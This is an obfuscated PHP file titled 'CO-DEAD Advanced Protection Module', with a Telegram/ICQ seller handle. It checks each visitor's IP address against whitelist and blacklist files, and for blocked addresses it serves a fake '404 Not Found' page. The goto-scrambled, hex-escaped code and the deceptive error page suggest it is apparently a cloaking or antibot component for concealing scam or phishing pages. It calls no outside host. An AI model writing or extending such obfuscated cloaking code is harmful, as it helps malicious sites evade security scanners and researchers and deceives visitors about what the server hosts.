<?php

/**
_________  ________             ________  ___________   _____  ________   
\_   ___ \ \_____  \            \______ \ \_   _____/  /  _  \ \______ \  
/    \  \/  /   |   \    ______  |    |  \ |    __)_  /  /_\  \ |    |  \ 
\     \____/    |    \  /_____/  |    `   \|        \/    |    \|    `   \
 \______  /\_______  /          /_______  /_______  /\____|__  /_______  /
        \/         \/                   \/        \/         \/        \/ 
		
			ICQ & Telegram = @CO_DEAD
            CO-DEAD Advanced Protection Module

            
 * DO NOT SELL THIS SCRIPT !
 * DO NOT CHANGE COPYRIGHT !
            
**/ 
goto gs3bK; GU1qx: $random_id = sha1(rand(0, 1000000)); goto V7VWg; F0xi3: $checklist = new IpBlockList(); goto GU1qx; ret1z: class IpList { private $iplist = array(); private $ipfile = ''; public function __construct($list) { $contents = array(); $this->ipfile = $list; $lines = $this->read($list); foreach ($lines as $line) { $line = trim($line); if (empty($line)) { continue; } if ($line[0] == "\x23") { continue; } $temp = explode("\x23", $line); $line = trim($temp[0]); $contents[] = $this->normal($line); } $this->iplist = $contents; } public function __destruct() { } public function __toString() { return implode("\40", $this->iplist); } public function is_inlist($ip) { $retval = false; foreach ($this->iplist as $ipf) { $retval = $this->ip_in_range($ip, $ipf); if ($retval === true) { $this->range = $ipf; break; } } return $retval; } public function iplist() { return $this->iplist; } public function message() { return $this->range; } public function append($ip, $comment) { return file_put_contents($this->ipfile, $ip, $comment); } public function listname() { return $this->ipfile; } private function read($fname) { try { $file = file($fname, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); } catch (Exception $e) { throw new Exception($fname . "\72\x20" . $e->getmessage() . "\12"); } return $file; } private function ip_in_range($ip, $range) { if (strpos($range, "\57") !== false) { list($range, $netmask) = explode("\x2f", $range, 2); if (strpos($netmask, "\x2e") !== false) { $netmask = str_replace("\52", "\60", $netmask); $dnetmask = ip2long($netmask); return (ip2long($ip) & $dnetmask) == (ip2long($range) & $dnetmask); } else { $r = explode("\x2e", $range); while (count($r) < 4) { $r[] = "\60"; } for ($i = 0; $i < 4; $i++) { $r[$i] = empty($r[$i]) ? "\60" : $r[$i]; } $range = implode("\56", $r); $dnetmask = ~(pow(2, 32 - $netmask) - 1); return (ip2long($ip) & $dnetmask) == (ip2long($range) & $dnetmask); } } else { if (strpos($range, "\x2a") !== false) { $low = str_replace("\x2a", "\x30", $range); $high = str_replace("\x2a", "\62\x35\65", $range); $range = $low . "\55" . $high; } if (strpos($range, "\55") !== false) { list($low, $high) = explode("\x2d", $range, 2); $dlow = $this->toLongs($low); $dhigh = $this->toLongs($high); $dip = $this->toLongs($ip); return $this->compare($dip, $dlow) != -1 && $this->compare($dip, $dhigh) != 1; } } return $ip == $range; } private function normal($range) { if (strpbrk("\x2a\x2d\x2f", $range) === False) { $range .= "\57\63\x32"; } return str_replace("\x20", '', $range); } private function toLongs($ip) { $Parts = explode("\x2e", $ip); $Ip = array('', ''); for ($i = 0; $i < 2; $i++) { $Ip[0] .= str_pad(base_convert($Parts[$i], 16, 2), 16, 0, STR_PAD_LEFT); } for ($i = 2; $i < 4; $i++) { $Ip[1] .= str_pad(base_convert($Parts[$i], 16, 2), 16, 0, STR_PAD_LEFT); } return array(base_convert($Ip[0], 2, 10), base_convert($Ip[1], 2, 10)); } private function compare($ipdec1, $ipdec2) { if ($ipdec1[0] < $ipdec2[0]) { return -1; } elseif ($ipdec1[0] > $ipdec2[0]) { return 1; } elseif ($ipdec1[1] < $ipdec2[1]) { return -1; } elseif ($ipdec1[1] > $ipdec2[1]) { return 1; } return 0; } } goto JgQpB; w7IC8: date_default_timezone_set("\x41\x73\151\x61\57\112\141\153\x61\162\x74\x61"); goto F0xi3; V7VWg: foreach ($ips as $ip) { $result = $checklist->ipPass($ip); if (!$result) { $msg = "\106\101\111\114\105\104\x3a\x20" . $checklist->message(); $ip = getenv("\x52\x45\115\x4f\124\x45\x5f\x41\x44\104\x52"); die("\74\x21\104\117\x43\x54\131\120\x45\40\x48\124\x4d\x4c\40\120\x55\102\x4c\111\103\x20\x22\55\x2f\x2f\x49\x45\124\x46\x2f\57\104\x54\x44\x20\110\124\115\x4c\x20\62\x2e\60\x2f\57\x45\x4e\42\x3e\x3c\x68\164\x6d\x6c\x3e\74\150\145\x61\x64\x3e\x3c\x74\151\x74\154\145\x3e\64\x30\x34\40\x4e\157\164\40\x46\157\x75\156\x64\x3c\x2f\x74\x69\x74\x6c\x65\x3e\74\x2f\150\145\x61\144\76\x3c\x62\x6f\144\171\76\74\x68\x31\76\x4e\157\x74\40\106\157\x75\x6e\x64\74\57\x68\x31\x3e\74\160\x3e\x54\150\145\40\x72\x65\161\165\145\163\164\145\x64\x20\125\122\x4c\x20\x77\x61\x73\40\156\157\164\x20\146\x6f\x75\x6e\x64\x20\157\156\x20\164\x68\151\163\x20\142\154\157\143\153\145\162\40\x73\x65\162\166\x65\162\x2e\74\x2f\x70\x3e\x3c\x70\76\101\x64\x64\151\164\x69\157\x6e\x61\x6c\x6c\x79\x2c\40\141\40\x34\x30\64\40\x4e\x6f\164\40\106\157\165\156\144\x20\145\162\x72\x6f\162\x20\x77\141\x73\x20\145\x6e\143\157\165\x6e\164\145\x72\145\x64\40\x77\150\151\154\x65\x20\164\x72\x79\151\156\x67\40\x74\157\40\165\x73\x65\x20\x61\x6e\x20\105\x72\x72\x6f\162\104\x6f\x63\165\155\x65\x6e\164\x20\x74\157\40\x68\141\156\144\154\145\40\164\150\145\x20\x72\145\x71\x75\145\x73\164\x2e\40\x66\x6f\x75\156\144\40\157\156\40\x64\x62\74\57\x70\x3e\x3c\x2f\x62\157\144\171\x3e\x3c\57\x68\x74\x6d\x6c\76"); } } goto ret1z; gs3bK: $ips = array($_SERVER["\x52\105\115\x4f\x54\x45\137\x41\x44\104\x52"]); goto w7IC8; JgQpB: class IpBlockList { private $statusid = array("\x6e\145\147\x61\164\x69\166\x65" => -1, "\156\145\165\x74\x72\141\154" => 0, "\x70\157\x73\151\164\151\x76\x65" => 1); private $whitelist = array(); private $blacklist = array(); private $message = NULL; private $status = NULL; public function __construct($whitelistfile = __DIR__ . "\57\144\141\164\141\142\141\163\x65\57\167\x68\x69\164\x65\154\x69\163\164\x2e\x64\141\164", $blacklistfile = __DIR__ . "\x2f\144\x61\x74\x61\x62\x61\x73\145\x2f\142\x6c\141\143\x6b\154\151\x73\x74\x2e\x64\x61\164") { $this->whitelistfile = $whitelistfile; $this->blacklistfile = $blacklistfile; $this->whitelist = new IpList($whitelistfile); $this->blacklist = new IpList($blacklistfile); } public function __destruct() { } public function ipPass($ip) { $retval = False; if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) { throw new Exception("\122\x65\161\165\151\162\x65\163\x20\166\x61\154\151\x64\x20\111\x50\166\x34\x20\141\144\x64\x72\145\163\163"); } if ($this->whitelist->is_inlist($ip)) { $retval = True; $this->message = $ip . "\x20\x69\163\x20\x77\x68\151\x74\x65\154\151\163\164\145\x64\x20\x62\x79\40" . $this->whitelist->message() . "\x2e"; $this->status = $this->statusid["\160\157\163\151\x74\151\x76\x65"]; } else { if ($this->blacklist->is_inlist($ip)) { $retval = False; $this->message = $ip . "\x20\151\x73\x20\142\154\x61\x63\x6b\154\x69\x73\164\x65\x64\x20\142\171\40" . $this->blacklist->message() . "\x2e"; $this->status = $this->statusid["\x6e\x65\x67\141\x74\151\x76\x65"]; } else { $retval = True; $this->message = $ip . "\x20\151\x73\40\x75\x6e\x6c\151\163\164\x65\x64\56"; $this->status = $this->statusid["\156\145\x75\164\x72\141\x6c"]; } } return $retval; } public function message() { return $this->message; } public function status() { return $this->status; } public function append($type, $ip, $comment = '') { if ($type == "\127\x48\111\x54\x45\114\x49\123\124") { $retval = $this->whitelistfile->append($ip, $comment); } elseif ($type == "\x42\114\101\x43\x4b\x4c\111\x53\x54") { $retval = $this->blacklistfile->append($ip, $comment); } else { $retval = false; } } public function filename($type, $ip, $comment = '') { if ($type == "\127\x48\x49\124\105\x4c\x49\x53\124") { $retval = $this->whitelistfile->filename($ip, $comment); } elseif ($type == "\x42\x4c\101\103\x4b\x4c\111\x53\124") { $retval = $this->blacklistfile->filename($ip, $comment); } else { $retval = false; } } } goto n36LI; n36LI: